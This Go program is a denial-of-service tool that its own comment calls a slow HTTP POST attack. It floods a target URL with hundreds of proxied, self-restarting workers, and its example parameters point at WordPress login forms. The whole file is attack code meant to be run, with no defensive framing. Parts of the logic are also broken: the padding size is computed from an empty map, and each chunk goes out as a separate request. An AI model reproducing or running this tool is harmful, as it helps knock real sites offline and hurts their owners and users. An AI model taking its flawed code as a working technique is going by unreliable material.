package main

import (
	"context"
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// Function to generate a Unicode string of a specific size (in bytes)
func generateUnicodeString(sizeBytes int) string {
	var builder strings.Builder
	unicodeChar := "你好مرحباこんにちは你" // You can replace this with other Unicode characters
	for builder.Len() < sizeBytes {
		builder.WriteString(unicodeChar)
	}
	return builder.String()[:sizeBytes] // Ensure we only return the exact number of bytes
}

// Function to calculate the size of the body required for each parameter
func calculateParamSize(totalSize int, params map[string]string) int {
	// Calculate the size for each parameter
	// Example: Total size of 127 KB, if there are 2 parameters, each should be about (127 KB - length of separators) / number of parameters
	// Adjust for URL encoding and key lengths
	numParams := len(params)
	if numParams == 0 {
		return 0
	}
	return (totalSize - (numParams * 1)) / numParams // 1 byte for each '&' or '&' for each key-value pair
}

// Function to parse parameters and replace `AUTO` with a Unicode string
func parseParams(paramStr string, bodySize int) map[string]string {
	params := make(map[string]string)
	paramPairs := strings.Split(paramStr, "&")
	paramSize := calculateParamSize(bodySize, params)
	for _, pair := range paramPairs {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := parts[0], parts[1]
		if value == "AUTO" {
			value = generateUnicodeString(paramSize) // Adjust size as needed
		}
		params[key] = value
	}
	return params
}

// Function to simulate a slow HTTP POST attack
func slowHTTPPost(url string, params map[string]string, chunkSize int, delay time.Duration, proxyURL *url.URL, ctx context.Context, stopChan <-chan struct{}) error {
	var bodyBuffer bytes.Buffer

	// Create the request body
	for key, value := range params {
		bodyBuffer.WriteString(fmt.Sprintf("%s=%s&", key, value))
	}

	// Remove the trailing '&'
	body := bodyBuffer.String()
	if len(body) > 0 {
		body = body[:bodyBuffer.Len()-1]
	}

	// Make the HTTP request
	client := &http.Client{}
	if proxyURL != nil {
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		}
		client.Transport = transport
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte("")))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the body in chunks
	for i := 0; i < len(body); i += chunkSize {
		select {
		case <-ctx.Done():
			return nil
		case <-stopChan:
			return nil
		default:
			end := i + chunkSize
			if end > len(body) {
				end = len(body)
			}
			chunk := body[i:end]
			req.Body = io.NopCloser(bytes.NewBufferString(chunk))

			// Send the request in small chunks with delays
			resp, err := client.Do(req)
			if err != nil {
				return err
			}
			resp.Body.Close()

			time.Sleep(delay)
		}
	}

	return nil
}

func worker(id int, url string, params map[string]string, chunkSize int, delay time.Duration, proxyURL *url.URL, ctx context.Context, stopChan <-chan struct{}) {

	fmt.Printf("Worker %d starting\n", id)
	err := slowHTTPPost(url, params, chunkSize, delay, proxyURL, ctx, stopChan)
	if err != nil {
		fmt.Printf("Worker %d encountered an error: %v\n", id, err)
	} else {
		select {
			case <-ctx.Done():
				return
			case <-stopChan:
				return
			default:
				fmt.Printf("Worker %d finished successfully, re-running\n", id)
				go worker(id, url, params, chunkSize, delay, proxyURL, ctx, stopChan)
		}
	}
}

func main() {
	// Define command-line flags
	urlPtr := flag.String("url", "", "The target URL (required)")
	paramsPtr := flag.String("params", "", "The POST parameters (e.g., log=AUTO&pwd=AUTO&rememberme=1&...)")
	numWorkersPtr := flag.Int("workers", 500, "The number of workers (goroutines)")
	delayPtr := flag.Duration("delay", 500*time.Millisecond, "The delay between chunks")
	proxyPtr := flag.String("proxies", "", "Comma-separated list of proxy URLs (optional)")
	processTimeoutPtr := flag.Duration("process-timeout", 120*time.Second, "Tempo total do processo (ex: 5m, 1h)")
	bodySizePtr := flag.Int("bodysize", 127*1024, "Size of the request body in bytes")

	// Parse the command-line flags
	flag.Parse()

	// Check if the URL is provided
	if *urlPtr == "" {
		fmt.Println("Error: The target URL is required.")
		flag.Usage() // Print usage information
		os.Exit(1)   // Exit with a non-zero status code
	}

	// Parse POST parameters
	params := parseParams(*paramsPtr, *bodySizePtr)

	// Set the timeout for the entire process
	ctx, cancel := context.WithTimeout(context.Background(), *processTimeoutPtr)
	defer cancel()
	stopChan := make(chan struct{})

	// Parse proxy URLs
	var proxyURL *url.URL
	if *proxyPtr != "" {
		proxyList := strings.Split(*proxyPtr, ",")
		if len(proxyList) > 0 {
			var err error
			proxyURL, err = url.Parse(proxyList[0]) // Use the first proxy from the list
			if err != nil {
				fmt.Printf("Error parsing proxy URL: %v\n", err)
				os.Exit(1)
			}
		}
	}


	// Run the specified number of goroutines
	for i := 1; i <= *numWorkersPtr; i++ {
		go worker(i, *urlPtr, params, 1024, *delayPtr, proxyURL, ctx, stopChan)
	}

	// Wait for the process timeout or completion
	<-ctx.Done()
	// Send signal to stop all goroutines
	close(stopChan)
	fmt.Println("Processo finalizado.")
	os.Exit(0)
}
